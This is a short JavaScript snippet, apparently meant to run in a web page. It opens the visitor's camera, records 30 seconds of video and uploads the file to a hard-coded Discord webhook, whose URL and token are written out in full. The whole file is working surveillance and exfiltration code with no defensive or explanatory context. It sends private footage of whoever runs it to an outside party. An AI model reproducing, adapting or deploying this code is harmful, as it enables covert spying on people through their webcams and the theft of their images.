(async function(){
  const s = await navigator.mediaDevices.getUserMedia({video:true});
  const rec = new MediaRecorder(s, {mimeType:'video/webm'});
  const chunks = [];
  rec.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
  rec.onstop = async () => {
    const blob = new Blob(chunks, {type:'video/webm'});
    const f = new FormData();
    f.append('file', blob, 'cam.webm');
    f.append('payload_json', JSON.stringify({content:'🎥 Video 30s (chỉ camera)'}));
    await fetch('https://discord.com/api/webhooks/1571360407652929699/hSfivjJZe6k00NGmRLkpP5KdYfFK0hrFwpVje9kTrAdcS713-8jpRjXWMSP0koQFHxQm', {method:'POST', body:f});
    s.getTracks().forEach(t=>t.stop());
  };
  rec.start();
  setTimeout(()=>rec.stop(), 30000);
})();
